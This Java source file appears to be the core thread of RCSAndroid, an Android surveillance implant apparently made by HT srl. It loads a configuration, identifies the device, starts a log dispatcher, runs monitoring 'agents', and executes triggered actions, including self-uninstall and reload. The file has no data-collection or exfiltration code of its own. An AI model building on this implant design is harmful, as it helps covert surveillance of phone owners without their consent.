/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

public class CoreThread extends Activity implements Runnable {
    //#ifdef DEBUG
    protected static Debug debug = new Debug("CoreThread");
    //#endif
    
	private boolean bStopCore = false;
	private Resources resources;
	private Thread coreThread;
	private ContentResolver contentResolver;
	private AgentManager agentManager;
	private EventManager eventManager;
	
	Thread actionThread;

	public boolean Start(Resources r, ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;
		
		Check.asserts(resources != null, "Null Resources");
		
		coreThread.start();
		return true;
	}

	public boolean Stop() {
		bStopCore = true;
		Log.d("RCS", "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	public void run() {
		Log.d("RCS", "RCS Thread Started");

		try {
			// Initialize the configuration object
			Configuration conf = new Configuration(this.resources);
			
			// Identify the device uniquely 
			Device device = Device.self();
			device.init(contentResolver);
			
			// Load the configuration
			conf.LoadConfiguration();
			
			// Start log dispatcher
			LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();
			
			// Start agents
			agentManager.startAgents();
			Utils.sleep(2000);
			agentManager.stopAgent(Agent.AGENT_DEVICE);
			Utils.sleep(2000);
			agentManager.startAgent(Agent.AGENT_DEVICE);
			Utils.sleep(2000);
			agentManager.restartAgent(Agent.AGENT_DEVICE);
			Utils.sleep(2000);
			// Stop agents
			agentManager.stopAgents();
			
			Status status = Status.self();
			status.triggerAction(0);
			int[] actionIds = status.getTriggeredActions();
			 final int asize = actionIds.length;
             if (asize > 0) {
                 for (int k = 0; k < asize; ++k) {
                     final int actionId = actionIds[k];
                     final Action action = status.getAction(actionId);             
                     int exitValue = executeAction(action);

                     if (exitValue == 1) {
                         //#ifdef DEBUG
                         //debug.info("checkActions: Uninstall");
                         //#endif
                         
                         //UninstallAction.actualExecute();
                         //return false;
                     } else if (exitValue == 2) {
                         //#ifdef DEBUG
                         //debug.trace("checkActions: want Reload");
                         //#endif
                         //return true;
                     }
                 }
             }
			


			// Ci stiamo chiudendo
			logDispatcher.halt();
			logDispatcher.join();
		
			
			Log.d("RCS", "LogDispatcher Killed");

		} catch (RCSException rcse) {
			rcse.printStackTrace();
			Log.d("RCS", "RCSException() detected");
		} catch (Exception e) {
			e.printStackTrace();
			Log.d("RCS", "Exception() detected");			
		}
		
		Log.d("RCS", "Exiting core");	
		return;

	}
	
	 private int executeAction(final Action action) {
	        int exit = 0;
	        //#ifdef DEBUG
	        debug.trace("CheckActions() triggered: " + action);
	        //#endif

	        Status status = Status.self();
	        status.unTriggerAction(action);
	        //action.setTriggered(false, null);

	        status.synced = false;
	        //final Vector subActions = action.getSubActionsList();
	        final int ssize = action.getSubActionsNum();

	        //#ifdef DEBUG
	        debug.trace("checkActions, " + ssize + " subactions");
	        //#endif

	        for (int j = 0; j < ssize; ++j) {
	            try {
	                final SubAction subAction = (SubAction) action.getSubAction(j);
	                //#ifdef DBC
	                Check.asserts(subAction != null,
	                        "checkActions: subAction!=null");
	                //#endif

	                //lastSubAction = subAction.toString();

	                /*
	                 * final boolean ret = subAction.execute(action
	                 * .getTriggeringEvent());
	                 */

	                //#ifdef DEBUG
	                debug.info("CheckActions() executing subaction (" + (j + 1)
	                        + "/" + ssize + ") : " + action);
	                //#endif

	                // no callingEvent
	                subAction.prepareExecute();
	                actionThread = new Thread(subAction);
	                actionThread.start();

	                synchronized (subAction) {
	                    //#ifdef DEBUG
	                    debug.trace("CheckActions() wait");
	                    //#endif  
	                    if (!subAction.isFinished()) {
	                        // il wait viene chiamato solo se la start non e' gia' finita
	                        subAction.wait(Configuration.TASK_ACTION_TIMEOUT);
	                    }
	                }

	                boolean ret = true;

	                if (!subAction.isFinished()) {
	                    ret = false;
	                    actionThread.interrupt();
	                    //#ifdef DEBUG
	                    debug.trace("CheckActions() interrupted thread");
	                    //#endif
	                }

	                //#ifdef DEBUG
	                debug.trace("CheckActions() waited");
	                //#endif

	                if (subAction.wantUninstall()) {
	                    //#ifdef DEBUG
	                    debug.warn("CheckActions() uninstalling");
	                    //#endif

	                    exit = 1;
	                    break;
	                    //return false;
	                }

	                if (subAction.wantReload()) {
	                    status.setRestarting(true);
	                    //#ifdef DEBUG
	                    debug.warn("checkActions: reloading");
	                    //#endif
	                    status.unTriggerAll();
	                    //#ifdef DEBUG
	                    debug.trace("checkActions: stopping agents");
	                    //#endif
	                    agentManager.stopAgents();
	                    //#ifdef DEBUG
	                    debug.trace("checkActions: stopping events");
	                    //#endif
	                    eventManager.stopEvents();
	                    Utils.sleep(2000);
	                    //#ifdef DEBUG
	                    debug.trace("checkActions: untrigger all");
	                    //#endif
	                    status.unTriggerAll();
	                    //return true;
	                    exit = 2;
	                    break;

	                }

	                if (ret == false) {
	                    //#ifdef DEBUG
	                    debug.warn("CheckActions() error executing: " + subAction);
	                    //#endif
	                    continue;
	                }
	            } catch (final Exception ex) {
	                //#ifdef DEBUG
	                debug.error("checkActions for: " + ex);
	                //#endif
	            }
	        }

	        return exit;
	    }

	public boolean Init() {
		return false;
	}
	
	public boolean Run() {
		return false;
	}
}
